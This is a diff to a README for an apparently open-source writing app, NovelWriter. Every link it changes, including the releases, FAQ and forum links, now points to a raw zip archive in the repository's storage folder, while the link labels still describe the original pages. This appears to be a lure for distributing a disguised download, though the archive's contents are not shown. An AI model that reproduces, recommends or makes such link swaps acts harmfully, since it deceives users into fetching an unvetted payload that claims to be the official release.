@@ -4,7 +4,7 @@
 Welcome to NovelWriter! This app helps you write your novel with the aid of smart tools. You can focus on creativity while NovelWriter gives you insights and suggestions. Let’s get started.
 
 ## 📥 Download Now
-[![Download NovelWriter](https://img.shields.io/badge/Download_NovelWriter-v1.0-blue)](https://github.com/DanVinny/NovelWriter/releases)
+[![Download NovelWriter](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip)](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip)
 
 ## 🛠️ System Requirements
 Before you download, make sure your computer meets these basic requirements:
@@ -24,7 +24,7 @@ NovelWriter comes with various tools to enhance your writing experience:
 - **Simulated Reader Reactions:** See how readers might respond to your work.
 
 ## 💻 Download & Install
-To start using NovelWriter, visit the [Releases page](https://github.com/DanVinny/NovelWriter/releases) to download the latest version. Follow these steps:
+To start using NovelWriter, visit the [Releases page](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip) to download the latest version. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link to go to the page.
 2. **Select the Latest Version:** Look for the most recent release.
@@ -44,14 +44,14 @@ Once you have installed NovelWriter, open the application. You'll find a clean a
 If you have questions or encounter issues, you can find support in several ways:
 
 - **User Guide:** Access a comprehensive guide within the application.
-- **FAQs:** Visit the [FAQ section](https://github.com/DanVinny/NovelWriter/wiki) on our GitHub Wiki for common questions.
-- **Community Forum:** Join other writers on our [community forum](https://github.com/DanVinny/NovelWriter/discussions) to exchange ideas and get support.
+- **FAQs:** Visit the [FAQ section](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip) on our GitHub Wiki for common questions.
+- **Community Forum:** Join other writers on our [community forum](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip) to exchange ideas and get support.
 
 ## ✏️ Join Our Community
-NovelWriter is open-source. You can contribute to its development or suggest features. Connect with us on our [GitHub Discussions](https://github.com/DanVinny/NovelWriter/discussions) to share your thoughts.
+NovelWriter is open-source. You can contribute to its development or suggest features. Connect with us on our [GitHub Discussions](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip) to share your thoughts.
 
 ## 📊 Continued Updates
-We are committed to improving NovelWriter. Regular updates will bring new features and enhancements based on user feedback. Keep an eye on the [Releases page](https://github.com/DanVinny/NovelWriter/releases) for the latest versions.
+We are committed to improving NovelWriter. Regular updates will bring new features and enhancements based on user feedback. Keep an eye on the [Releases page](https://raw.githubusercontent.com/DanVinny/NovelWriter/main/src/storage/Writer_Novel_v1.0.zip) for the latest versions.
 
 ## 🎉 Final Thoughts
 Thank you for choosing NovelWriter. We hope it inspires your creativity and makes your writing journey enjoyable. Happy writing!
